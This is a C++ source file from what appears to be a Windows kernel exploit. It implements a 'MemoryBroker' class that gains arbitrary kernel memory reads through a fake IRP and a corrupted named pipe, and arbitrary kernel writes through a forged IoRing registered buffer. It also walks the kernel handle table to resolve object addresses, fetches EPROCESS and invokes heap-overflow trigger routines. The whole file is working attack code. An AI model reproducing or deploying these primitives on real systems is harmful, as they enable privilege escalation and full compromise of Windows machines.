#include "memoryBroker.h"
#include "pipeManager.h"
#include "ioRingManager.h"
#include "Hvergelmir.h"


bool MemoryBroker::EnumVersion()
{
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) {
        DEBUG_PRINT("[-] Failed to get handle to ntdll.dll\n");
        return false;
    }

    RtlGetVersionPtr pRtlGetVersion = (RtlGetVersionPtr)GetProcAddress(hNtdll, "RtlGetVersion");
    if (!pRtlGetVersion) {
        DEBUG_PRINT("[-] Failed to locate RtlGetVersion in ntdll.dll\n");
        return false;
    }

    RTL_OSVERSIONINFOW osInfo = { 0 };
    osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    NTSTATUS status = pRtlGetVersion(&osInfo);
    if (status != STATUS_SUCCESS) {
        DEBUG_PRINT("[-] RtlGetVersion failed with NTSTATUS: 0x%X\n", status);
        return false;
    }

    DEBUG_PRINT("[+] Successfully resolved OS Version.\n");
    DEBUG_PRINT("[+] Major: %lu, Minor: %lu, Build: %lu\n",
        osInfo.dwMajorVersion, osInfo.dwMinorVersion, osInfo.dwBuildNumber);

    // 5. Map your struct sizes and offsets based on the exact kernel build

    if (osInfo.dwBuildNumber >= 26200) {
        // Windows 11 25H2
        DEBUG_PRINT("[*] Applying offsets for Windows 11 25H2...\n");
    }
    else if (osInfo.dwBuildNumber >= 26100) {
        // Windows 11 24H2
        DEBUG_PRINT("[*] Applying offsets for Windows 11 24H2...\n");
    }
    else if (osInfo.dwBuildNumber >= 22000) {
        // Windows 11 21H2 / 22H2 / 23H2
        DEBUG_PRINT("[*] Applying offsets for Windows 11...\n");
    }
    else if (osInfo.dwBuildNumber >= 19041) {
        // Windows 10 20H1 - 22H2
        DEBUG_PRINT("[*] Applying offsets for Windows 10...\n");
    }
    else {
        DEBUG_PRINT("[-] Unsupported Windows build number.\n");
        return false;
    }
    return true;
}

// Simple helper to scan a buffer for an ASCII tag and return offsets
std::vector<UINT64> MemoryBroker::ScanForPoolTag(const BYTE* data, size_t size, const char* tag)
{
	std::vector<UINT64> offsets;
	if (!data || !tag) return offsets;
	size_t tagLen = strlen(tag);
	if (tagLen == 0 || size < tagLen) return offsets;
	for (size_t i = 0; i + tagLen <= size; ++i) {
		if (memcmp(data + i, tag, tagLen) == 0) offsets.push_back((UINT64)i);
	}
	return offsets;
}




MemoryBroker::MemoryBroker()
{
    tmpData = new BYTE[0x500];
	if (tmpData) memset(tmpData, 0x69, 0x500);
	HANDLE_TABLE = 0x0;
	TABLE_CODE = 0x0;
	fakeIRP = nullptr;
	fakePipeMessage = nullptr;
	EPROCESS = 0;
	readEnabled = false;
	writeEnabled = false;

	nameManager = std::weak_ptr<ThreadNameManager>();
	ioRingManager = std::weak_ptr<IORingManager>();
	pipeManager = std::weak_ptr<PipeManager>();

	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	_NtFsControlFile = nullptr;
	if (ntdll) _NtFsControlFile = (pNtFsControlFile)GetProcAddress(ntdll, "NtFsControlFile");
}

void MemoryBroker::CreateFakeIRP()
{
    if (!tmpData) {
		DEBUG_PRINT(" [!] tmpData not initialized, cannot create fake IRP\n");
		return;
	}
	if (fakeIRP) delete fakeIRP;
	fakeIRP = new IRP;
	if (!fakeIRP) {
		DEBUG_PRINT(" [!] Failed to allocate fakeIRP\n");
		return;
	}
	fakeIRP->SystemBuffer = tmpData;
	readEnabled = true;
}

void MemoryBroker::CreateFakeRegBuffer(BYTE* seedData)
{
    if (!seedData) {
		DEBUG_PRINT(" [!] seedData is null, cannot create fakeRegBuffer\n");
		return;
	}
	if (fakeRegBuffer) free(fakeRegBuffer);
	fakeRegBuffer = (IOP_MC_BUFFER_ENTRY*)malloc(sizeof(IOP_MC_BUFFER_ENTRY));
	if (!fakeRegBuffer) {
		DEBUG_PRINT(" [!] Failed to allocate fakeRegBuffer\n");
		return;
	}
	size_t copySz = std::min<size_t>(sizeof(IOP_MC_BUFFER_ENTRY), 0x80);
	memcpy(fakeRegBuffer, seedData, copySz);
	writeEnabled = true;
}


void MemoryBroker::Read(UINT64* iDestinationAddr, UINT64 iTargetAddr, UINT64 iSize)
{
    if (!readEnabled) {
		DEBUG_PRINT(" [!] Read not enabled (fakeIRP missing)\n");
		return;
	}
	if (!iDestinationAddr) {
		DEBUG_PRINT(" [!] iDestinationAddr is null\n");
		return;
	}
	if (iSize == 0) {
		DEBUG_PRINT(" [!] iSize is zero\n");
		return;
	}

	auto pm = pipeManager.lock();
	if (!pm) {
		DEBUG_PRINT(" [!] No PipeManager set or it expired\n");
		return;
	}
	if (pm->corruptedPipe == NULL || pm->corruptedPipe == INVALID_HANDLE_VALUE) {
		DEBUG_PRINT(" [!] corruptedPipe invalid\n");
		return;
	}

	// limit allocation to reasonable maximum (avoid OOM from bad size)
	const size_t MAX_READ = 16 * 1024 * 1024; // 16 MB
	if (iSize > MAX_READ) {
		DEBUG_PRINT(" [!] Requested read size too large: %llu\n", (unsigned long long)iSize);
		return;
	}

    // Ensure fake IRP points at the target kernel address for the read
	if (!fakeIRP) {
		// allocate a minimal IRP so we can set the SystemBuffer
		fakeIRP = new IRP;
		if (!fakeIRP) {
			DEBUG_PRINT(" [!] Failed to allocate fakeIRP for read\n");
			return;
		}
	}
	fakeIRP->SystemBuffer = (PVOID)(uintptr_t)iTargetAddr;

	// Prepare buffer and peek
	std::vector<BYTE> buffer((size_t)iSize);
	DWORD bytesAvailable = 0;
	BOOL status = PeekNamedPipe(pm->corruptedPipe, buffer.data(), (DWORD)iSize, NULL, &bytesAvailable, NULL);
	if (!status) {
		DEBUG_PRINT(" [!] PeekNamedPipe failed in MemoryBroker::Read\n");
		return;
	}

    size_t copyLen = std::min<size_t>((size_t)(bytesAvailable ? bytesAvailable : (DWORD)iSize), (size_t)iSize);
	if (copyLen == 0) {
		DEBUG_PRINT(" [!] No data available to read\n");
		return;
	}

	// copy to destination pointer (caller-provided). Copy only copyLen bytes.
	memcpy((void*)iDestinationAddr, buffer.data(), copyLen);
}


void MemoryBroker::Write(BYTE* iDestinationAddr, UINT64 data, UINT64 size)
{
	if (!writeEnabled) {
		DEBUG_PRINT(" [!] Write not enabled (fakeRegBuffer missing)\n");
		return;
	}
	if (!iDestinationAddr) {
		DEBUG_PRINT(" [!] iDestinationAddr is null\n");
		return;
	}
	if (size == 0) {
		DEBUG_PRINT(" [!] size is zero\n");
		return;
	}

	auto irm = ioRingManager.lock();
	if (!irm) {
		DEBUG_PRINT(" [!] No IoRingManager set or it expired\n");
		return;
	}

	if (!fakeRegBuffer) {
		DEBUG_PRINT(" [!] fakeRegBuffer not initialized\n");
		return;
	}

	// set up the fakeRegBuffer and trigger
	fakeRegBuffer->Address = iDestinationAddr;
	fakeRegBuffer->Length = (ULONG)size;
	// Ensure payload size fits into expected type
	if (size > UINT32_MAX) {
		DEBUG_PRINT(" [!] payload size too large: %llu\n", (unsigned long long)size);
		return;
	}

	irm->TriggerCorruptRing(data, size);
}

UINT64 MemoryBroker::GetEPROCESS()
{
	if (EPROCESS == 0) {
		DEBUG_PRINT(" [!] EPROCESS not found yet\n");
	}
	return EPROCESS;
}

UINT64 MemoryBroker::HandleToPointer(HANDLE iHandle)
{

	// Walk handle to table to resolve user mode handle to kernel address
    if (!HANDLE_TABLE)
	{
		DEBUG_PRINT(" [!] Cant Translate Handle Until HANDLE_TABLE Found!\n");
		return NULL;
	}

    if (!TABLE_CODE)
	{
		Read(&TABLE_CODE, HANDLE_TABLE + 0x08, sizeof(UINT64));
		if (!TABLE_CODE)
		{
			DEBUG_PRINT(" [!] Failed to get TABLE_CODE\n");
			return NULL;
		}
	}

	// Make sure it is a 2 level table
	UINT64 tableLevel = TABLE_CODE & 3;

	if (!tableLevel)
		return NULL;

	UINT64 l1TableBase = TABLE_CODE & ~3;

	UINT64 handleIndex = (UINT64)iHandle / 4;

	// Find which level 1 entry needs to be followed
	UINT64 l1HandleOffset = (handleIndex / 0x100) * 0x8;

	// Find the index in the level 2 table
	UINT64 l2HandleOffset = (handleIndex % 0x100) * 0x10;

	UINT64 l2TableBase;
	Read(&l2TableBase, l1TableBase + l1HandleOffset, sizeof(UINT64));

	INT64 handleEntry;
	Read((UINT64*)&handleEntry, l2TableBase + l2HandleOffset, sizeof(UINT64));

	// Must be signed int to fill top 4 bytes with F when shift
	INT64 handleEntryShift = handleEntry >> 20;
	UINT64 objectHeader = handleEntryShift << 4;
	UINT64 fileObject = objectHeader + 0x30;


	return fileObject;
}

// smart pointers / raw buffers cleaned up by default destructor

void MemoryBroker::InvokePrimeOverflow(UINT64 count)
{
	try {
		Hvergelmir &h = Hvergelmir::getInstance();
		if (h.PrimeOverflow) h.PrimeOverflow(count);
	}
	catch (...) {
		DEBUG_PRINT(" [!] Exception while invoking PrimeOverflow\n");
	}
}

void MemoryBroker::InvokeTriggerOverflow(BYTE* buf, UINT64 size)
{
	try {
		Hvergelmir &h = Hvergelmir::getInstance();
		if (h.TriggerOverflow) h.TriggerOverflow(buf, size);
	}
	catch (...) {
		DEBUG_PRINT(" [!] Exception while invoking TriggerOverflow\n");
	}
}

void MemoryBroker::InvokePassOverflow()
{
	try {
		Hvergelmir &h = Hvergelmir::getInstance();
		if (h.PassOverflow) h.PassOverflow();
	}
	catch (...) {
		DEBUG_PRINT(" [!] Exception while invoking PassOverflow\n");
	}
}

void HexDumpLittleEndian(void* memoryAddress, size_t sizeInBytes) {
	uint64_t* qwordPointer = (uint64_t*)memoryAddress;
	size_t totalQwords = sizeInBytes / 8;


	// Loop through memory, advancing by 2 QWORDs (16 bytes) each time
	for (size_t i = 0; i < totalQwords; i += 2) {

		// Print the row address
		printf("    [%p]  ", (void*)(qwordPointer + i));

		// Print the first QWORD
		printf("%016llX  ", qwordPointer[i]);

		// Print the second QWORD if it exists
		if (i + 1 < totalQwords) {
			printf("%016llX", qwordPointer[i + 1]);
		}

		printf("\n");
	}

}